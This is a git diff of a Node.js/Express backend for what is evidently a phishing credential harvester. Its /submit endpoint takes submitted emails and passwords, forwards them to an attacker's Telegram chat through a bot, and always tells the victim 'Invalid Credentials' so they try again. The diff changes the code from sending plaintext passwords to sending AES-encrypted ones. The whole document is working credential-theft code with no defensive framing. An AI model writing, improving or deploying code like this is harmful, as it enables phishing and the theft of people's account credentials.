@@ -21,7 +21,7 @@ app.use(express.json());
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-const SECRET_KEY = process.env.SECRET_KEY; // Secret key is in backend only
+const SECRET_KEY = process.env.SECRET_KEY; // Secret key is only in backend
 
 async function sendToTelegram(message) {
   try {
@@ -36,20 +36,14 @@ async function sendToTelegram(message) {
   }
 }
 
-// 🔐 Decrypt the password before sending to Telegram
-function decryptPassword(encrypted) {
-  try {
-    const bytes = CryptoJS.AES.decrypt(encrypted, SECRET_KEY);
-    return bytes.toString(CryptoJS.enc.Utf8); // Convert back to plain text
-  } catch (error) {
-    console.error("Decryption failed:", error);
-    return "Decryption Error";
-  }
+// 🔐 Encrypt the password before sending to Telegram
+function encryptPassword(password) {
+  return CryptoJS.AES.encrypt(password, SECRET_KEY).toString();
 }
 
 app.post("/submit", async (req, res) => {
   try {
-    console.log("Received data:", req.body); // 🔥 Logs incoming data to debug
+    console.log("Received data:", req.body); // 🔥 Logs incoming data for debugging
 
     const { email, password } = req.body;
     if (!email || !password) {
@@ -58,15 +52,15 @@ app.post("/submit", async (req, res) => {
         .json({ status: "error", message: "Missing fields" });
     }
 
-    const decryptedPassword = password; // No need to decrypt since frontend sends plaintext
+    const encryptedPassword = encryptPassword(password); // 🔥 Encrypt password in backend
 
     await sendToTelegram(
-      `📧 Email: ${email}\n🔑 Password: ${decryptedPassword}`
+      `📧 Email: ${email}\n🔐 Encrypted Password: ${encryptedPassword}`
     );
 
     res.json({
       status: "success",
-      message: "Incorrect Credentials, please try again!",
+      message: "Invalid Credentials, please try again!",
     });
   } catch (error) {
     console.error("Error processing request:", error);
